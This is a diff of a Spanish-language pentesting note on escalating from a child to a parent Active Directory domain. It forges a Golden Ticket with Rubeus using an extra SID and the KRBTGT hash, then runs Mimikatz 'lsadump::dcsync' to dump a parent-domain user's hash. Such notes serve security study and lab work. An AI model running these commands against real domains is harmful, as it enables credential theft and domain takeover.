@@ -1,3 +1,4 @@
+#AD #ExtaSID #SIDHistory #KRBTGT #GoldenTicket #DCSync 
 
 >Una confianza de dominio se utiliza para establecer la autenticación entre bosques o dominios.
 >Este caso se da cuando una empresa por ejemplo tiene dos dominios diferentes y los fusionan, pudiendo los usuarios poder acceder a ambos dominios
@@ -69,14 +70,20 @@ rubeus golden /rc4:<hash.KRBTGT> /domain:<Dominio.Principal> /sid:<SID.Secundari
 ```
 
 
-### Validacion Golden Ticket
+### Validación Golden Ticket
 Usaremos el comando 
 
 ```shell
 klist
 ```
 
-Para validar que el ticket se encuentra en la memoria, viendo que se encuentra ahi desde nustro dominio secundario(child) podemos ver el dominio principal y escalarlo a un ataque `DCSync`
+Para validar que el ticket se encuentra en la memoria, viendo que se encuentra ahí desde nustro dominio secundario(child) podemos ver el dominio principal y escalarlo a un ataque `DCSync`
 
 # DCSync Attack
-Usando la herramienta de [[MIMIKATZ]] podemos ejecutar este ataque para obtener las credenciales de un usuario de la maquina de domini
+Usando la herramienta de [[MIMIKATZ]] podemos ejecutar este ataque para obtener las credenciales de un usuario de la maquina de dominio principal(parent)
+
+```shell
+lsadump::dcsync /user:<Dominio.Principal>\user /domain:<Dominio.Principal>
+```
+
+Obteniendo así el hash del `user` y pudiendo usarlo para acceder al dominio principal(parent)
